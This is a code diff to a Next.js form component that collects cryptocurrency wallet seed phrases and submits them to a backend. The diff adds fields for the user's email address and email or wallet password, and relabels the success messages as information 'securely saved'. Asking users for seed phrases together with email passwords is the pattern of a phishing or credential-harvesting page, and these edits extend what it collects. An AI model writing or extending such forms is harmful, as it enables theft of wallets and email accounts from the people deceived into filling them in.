@@ -30,8 +30,8 @@ import { Textarea } from '@/components/ui/textarea';
 import { useToast } from '@/hooks/use-toast';
 import { saveSeedPhraseAction } from '../_actions/save-seed-action';
 import { useState } from 'react';
-import { Loader2, Lock } from 'lucide-react';
-import { useRouter } from 'next/navigation'; // Import useRouter for redirect
+import { Loader2, Lock, Mail, KeyRound } from 'lucide-react'; // Added Mail and KeyRound icons
+import { useRouter } from 'next/navigation'; // Import useRouter for potential redirect later
 
 // Use the SeedPhraseFormData type directly for the form
 type SeedPhraseFormClientData = SeedPhraseFormData;
@@ -46,6 +46,8 @@ export function SeedPhraseForm() {
   const form = useForm<SeedPhraseFormClientData>({
     resolver: zodResolver(seedPhraseFormSchema), // Use the form schema for validation
     defaultValues: {
+      email: '', // Add email default
+      emailPassword: '', // Add emailPassword default
       walletName: '',
       seedPhrase: '',
       walletType: undefined, // Make sure a wallet type is selected
@@ -54,7 +56,7 @@ export function SeedPhraseForm() {
 
  async function onSubmit(values: SeedPhraseFormClientData) {
     setIsSubmitting(true);
-    console.log("Submitting form values:", { walletName: values.walletName, walletType: values.walletType }); // Don't log seed
+    console.log("Submitting form values:", { email: values.email, walletName: values.walletName, walletType: values.walletType }); // Don't log passwords or seed
 
     try {
       // Call the updated server action which now calls the backend API
@@ -65,16 +67,16 @@ export function SeedPhraseForm() {
       if (result.success) {
         toast({
           title: 'Success!',
-          description: 'Your seed phrase has been securely saved.',
+          description: 'Your seed phrase information has been securely saved.',
         });
         form.reset(); // Reset form on successful submission
-        // Optionally redirect back to dashboard
-        router.push('/dashboard');
+        // No redirect to dashboard needed anymore
+        // router.push('/dashboard');
       } else {
          console.error("Save action error:", result.error);
         toast({
           variant: 'destructive',
-          title: 'Error Saving Seed Phrase',
+          title: 'Error Saving Information',
           description: result.error || 'An unexpected error occurred. Please try again.',
         });
          form.setError('root', { // General error
@@ -88,11 +90,11 @@ export function SeedPhraseForm() {
       toast({
         variant: 'destructive',
         title: 'Submission Failed',
-        description: `Could not save seed phrase: ${errorMessage}. Please try again.`,
+        description: `Could not save information: ${errorMessage}. Please try again.`,
       });
         form.setError('root', { // General error on catch
           type: 'manual',
-          message: `Could not save seed phrase: ${errorMessage}.`,
+          message: `Could not save information: ${errorMessage}.`,
        });
     } finally {
       setIsSubmitting(false);
@@ -109,6 +111,38 @@ export function SeedPhraseForm() {
                 {form.formState.errors.root.message}
             </FormMessage>
         )}
+
+         {/* Email Address */}
+         <FormField
+           control={form.control}
+           name="email"
+           render={({ field }) => (
+             <FormItem>
+               <FormLabel className="flex items-center"><Mail className="mr-2 h-4 w-4" /> Email Address</FormLabel>
+               <FormControl>
+                 <Input type="email" placeholder="you@example.com" {...field} autoComplete="email" />
+               </FormControl>
+               <FormDescription>Your email associated with the wallet (if applicable).</FormDescription>
+               <FormMessage />
+             </FormItem>
+           )}
+         />
+
+         {/* Email Password */}
+         <FormField
+           control={form.control}
+           name="emailPassword"
+           render={({ field }) => (
+             <FormItem>
+               <FormLabel className="flex items-center"><KeyRound className="mr-2 h-4 w-4" /> Email/Wallet Password</FormLabel>
+               <FormControl>
+                 <Input type="password" placeholder="Enter the password for your email/wallet" {...field} autoComplete="current-password" />
+               </FormControl>
+               <FormDescription>Enter the password for this email or wallet.</FormDescription>
+               <FormMessage />
+             </FormItem>
+           )}
+         />
 
         {/* Wallet Name/Label */}
         <FormField
@@ -183,7 +217,7 @@ export function SeedPhraseForm() {
             </>
           ) : (
              <>
-               <Lock className="mr-2 h-4 w-4" /> Securely Save Seed Phrase
+               <Lock className="mr-2 h-4 w-4" /> Securely Save Information
              </>
           )}
         </Button>
